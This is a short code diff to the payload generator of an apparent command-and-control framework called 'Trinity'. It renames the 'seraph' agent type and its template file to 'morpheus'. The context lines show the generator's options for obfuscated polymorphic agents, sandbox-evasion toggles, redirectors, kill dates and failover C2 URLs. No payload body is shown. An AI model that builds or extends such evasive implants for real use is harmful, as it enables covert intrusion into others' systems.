@@ -180,8 +180,8 @@ class PayloadGenerator:
         profile_headers = profile_config.get('headers', {'User-Agent': 'Trinity C2 Agent'})
 
         print(f"[+] Generating polymorphic variant")
-        if payload_type == "seraph":
-            return self._generate_seraph(
+        if payload_type == "morpheus":
+            return self._generate_morpheus(
                 agent_id, secret_key, c2_server_url, profile_config, obfuscate, disable_sandbox=disable_sandbox, kill_date=kill_date, working_hours=working_hours, use_redirector=use_redirector, redirector_host=redirector_host, redirector_port=redirector_port, use_failover=use_failover, failover_urls=failover_urls
             )
         elif payload_type == "trinity":
@@ -191,7 +191,7 @@ class PayloadGenerator:
         else:
             raise ValueError(f"Unsupported payload type: {payload_type}")
 
-    def _generate_seraph(self, agent_id, secret_key, c2_url, profile_config, obfuscate, disable_sandbox=False, kill_date='2025-12-31T23:59:59Z', working_hours=None, use_redirector=False, redirector_host='0.0.0.0', redirector_port=80, use_failover=False, failover_urls=None):
+    def _generate_morpheus(self, agent_id, secret_key, c2_url, profile_config, obfuscate, disable_sandbox=False, kill_date='2025-12-31T23:59:59Z', working_hours=None, use_redirector=False, redirector_host='0.0.0.0', redirector_port=80, use_failover=False, failover_urls=None):
         if failover_urls is None:
             failover_urls = []
         if working_hours is None:
@@ -343,7 +343,7 @@ class PayloadGenerator:
         listener_id_for_registration = 'web_app_default'
 
 
-        template_path = os.path.join(os.path.dirname(__file__), 'seraph_template.py')
+        template_path = os.path.join(os.path.dirname(__file__), 'morpheus_template.py')
         with open(template_path, 'r') as f:
             agent_template = f.read()
 
@@ -452,7 +452,7 @@ class PayloadGenerator:
             m_relay_data=m_relay_data
         )
 
-        print(f"[+] POLYMORPHIC Seraph agent generated (Class: {class_name})")
+        print(f"[+] POLYMORPHIC Morpheus agent generated (Class: {class_name})")
         return agent_template.strip()
 
 
